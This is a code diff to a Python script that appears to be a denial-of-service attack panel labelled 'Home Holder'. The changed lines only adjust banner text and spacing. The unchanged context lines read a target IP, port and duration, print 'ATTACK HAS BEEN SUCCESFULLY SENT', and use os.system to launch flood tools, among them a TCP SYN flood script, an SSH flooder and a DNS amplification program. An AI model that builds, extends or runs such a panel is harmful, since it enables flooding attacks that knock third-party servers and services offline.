@@ -126,7 +126,7 @@ _\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
 
 def si():
 	clear()
-	print(f'         \x1b[38;2;255;215;0m[Resemble Home Holder')
+	print(f'         \x1b[38;2;255;215;0m[ Home Holder')
 	print("")
 	
 def methods():
@@ -147,8 +147,7 @@ def menu():
 	clear()
 	si()
 	print(f'''
-Type "help" or methods" to see methods
-
+Type "methods" to see methods
 ''')
 def attack():
     clear()
@@ -189,7 +188,7 @@ def main():
                 TIME = cnc.split()[3]
                 attack()
                 print(f'''
-\x1b[38;2;113;3;255m             ║         [ATTACK HAS BEEN SUCCESFULLY SENT!!!]        ║
+\x1b[38;2;113;3;255m                   [ATTACK HAS BEEN SUCCESFULLY SENT!!!]
 ''')
 
                 time.sleep(3)
@@ -204,7 +203,7 @@ def main():
                 TIME = cnc.split()[3]
                 attack()
                 print(f'''
-\x1b[38;2;113;3;255m             ║         [ATTACK HAS BEEN SUCCESFULLY SENT!!!]        ║
+\x1b[38;2;113;3;255m                       [ATTACK HAS BEEN SUCCESFULLY SENT!!!]        
 ''')
                 time.sleep(3)
                 os.system(f'perl TCP-SYN.pl {IP} {PORT} 65500 {TIME}')
@@ -219,7 +218,7 @@ def main():
                 TIME = cnc.split()[3]
                 attack()
                 print(f'''
-\x1b[38;2;113;3;255m             ║         [ATTACK HAS BEEN SUCCESFULLY SENT!!!]        ║
+\x1b[38;2;113;3;255m                       [ATTACK HAS BEEN SUCCESFULLY SENT!!!]         
 ''')
                 time.sleep(3)
                 os.system(f'./100UP-SSH {IP} {PORT} 1025 {TIME}')
@@ -234,7 +233,7 @@ def main():
                 TIME = cnc.split()[3]
                 attack()
                 print(f'''
-\x1b[38;2;113;3;255m             ║         [ATTACK HAS BEEN SUCCESFULLY SENT!!!]        ║
+\x1b[38;2;113;3;255m                       [ATTACK HAS BEEN SUCCESFULLY SENT!!!]         
 ''')
                 time.sleep(3)
                 os.system(f'./100UP-SSH {IP} {PORT} 1025 {TIME}')
@@ -248,7 +247,7 @@ def main():
                 TIME = cnc.split()[3]
                 attack()
                 print(f'''
-\x1b[38;2;113;3;255m             ║         [ATTACK HAS BEEN SUCCESFULLY SENT!!!]        ║
+\x1b[38;2;113;3;255m                        [ATTACK HAS BEEN SUCCESFULLY SENT!!!]       
 ''')
                 time.sleep(3)
                 os.system(f'dnsamp.c {IP} {PORT} 1025 {TIME}')
